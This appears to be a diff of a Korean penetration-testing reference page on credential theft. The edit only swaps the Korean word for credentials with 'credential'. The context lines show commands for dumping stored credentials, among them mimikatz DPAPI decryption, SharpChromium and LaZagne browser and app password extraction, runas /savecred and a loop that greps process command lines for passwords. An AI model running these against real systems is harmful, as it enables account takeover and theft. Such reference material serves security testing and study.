@@ -1,4 +1,4 @@
-# 자격 증명 탈취
+# credential 탈취
 
 credential 확보를 위한 공격 기법. Kerberos 기반 공격, 메모리 덤프, credential 파일 탈취 등.
 
@@ -229,12 +229,12 @@ use auxiliary/scanner/smb/smb_enum_gpp
 
 ## DPAPI (Data Protection API)
 
-Windows에서 Chrome 비밀번호, Credential Manager, RDP 자격 증명 등을 보호하는 암호화 체계.
+Windows에서 Chrome 비밀번호, Credential Manager, RDP credential 등을 보호하는 암호화 체계.
 
 ```powershell
-# Credential Manager 저장 자격 증명 확인
+# Credential Manager 저장 credential 확인
 cmdkey /list
-# 저장된 자격 증명으로 실행
+# 저장된 credential으로 실행
 runas /savecred /user:DOMAIN\admin cmd.exe
 
 # DPAPI MasterKey 위치
@@ -258,7 +258,7 @@ dpapi::cred /in:C:\Users\USER\AppData\Local\Microsoft\Credentials\CRED_FILE /mas
 # SharpChromium (Chrome/Edge)
 .\SharpChromium.exe logins
 
-# LaZagne (다수 앱의 자격 증명 일괄 추출)
+# LaZagne (다수 앱의 credential 일괄 추출)
 .\LaZagne.exe all
 
 # Linux
@@ -338,7 +338,7 @@ find / -name "*.kdbx" 2>/dev/null
 # 환경변수
 env | grep -i pass
 
-# 런타임 프로세스에서 자격 증명
+# 런타임 프로세스에서 credential
 # /proc/PID/cmdline, /proc/PID/environ
 for pid in $(ls /proc | grep -E '^[0-9]+$'); do
   cat /proc/$pid/cmdline 2>/dev/null | tr '\0' ' ' | grep -i 'pass'
@@ -352,6 +352,6 @@ find / -name ".git" -type d 2>/dev/null
 ---
 
 !!! info "관련 페이지"
-    - 획득한 자격 증명 활용 → [횡적 이동](../lifecycle/lateral-movement.md)
+    - 획득한 credential 활용 → [횡적 이동](../lifecycle/lateral-movement.md)
     - Kerberoasting/DCSync 도구 → [도구 레퍼런스](../tools/index.md) (Impacket, Rubeus)
     - ADCS 인증서 기반 인증 → [ADCS 공격](../ad/adcs.md)
